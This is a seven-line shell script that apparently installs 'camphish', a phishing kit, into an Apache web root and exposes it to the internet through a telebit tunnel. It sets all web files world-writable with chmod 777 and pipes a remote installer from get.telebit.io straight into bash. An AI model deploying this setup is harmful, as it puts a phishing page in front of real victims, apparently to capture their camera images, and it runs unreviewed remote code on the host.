sudo apt-get install curl
sudo cp -r ../camphish /var/www/html/
sudo chmod 777 /var/www/html/*
sudo service apache2 start
echo "~/telebit http 80">camphish.sh
sudo curl https://get.telebit.io/ |bash
echo "type ~/telebit http 80 for start"
